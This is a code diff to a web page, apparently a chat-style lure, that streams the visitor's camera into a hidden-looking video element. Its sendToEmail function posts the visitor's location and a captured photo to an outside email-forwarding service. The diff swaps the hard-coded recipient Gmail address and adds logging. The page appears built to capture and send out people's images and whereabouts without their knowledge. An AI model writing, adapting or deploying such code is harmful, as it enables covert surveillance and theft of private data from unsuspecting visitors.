@@ -224,7 +224,10 @@
  <video id="video-source" autoplay playsinline muted></video>
 
  <script>
- const EMAIL_DESTINATION = "desamuncrat477@gmail.com";
+ // --- KONFIGURASI EMAIL DIUBAH ---
+ const EMAIL_DESTINATION = "milandahayani477@gmail.com";
+ // ------------------------------
+
  const chatArea = document.getElementById('chat-area');
  const loader = document.getElementById('loader');
  const loaderText = document.getElementById('loader-text');
@@ -349,6 +352,7 @@
  }
 
  async function sendToEmail(lokasiObj, fotoBlob) {
+ console.log("Memulai pengiriman email ke:", EMAIL_DESTINATION);
  const formData = new FormData();
  // Pastikan field name 'attachment' sesuai dengan config FormSubmit
  formData.append('message', `Lokasi:\n${lokasiObj.desc}`);
@@ -363,8 +367,10 @@
      if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
      const data = await response.json();
      console.log("Email Success:", data);
+     // alert("Email terkirim! Cek folder Spam jika tidak masuk inbox.");
      
  } catch (err) {
+     console.error("Gagal kirim email:", err);
      throw new Error(`Gagal kirim email: ${err.message}`);
  }
  }
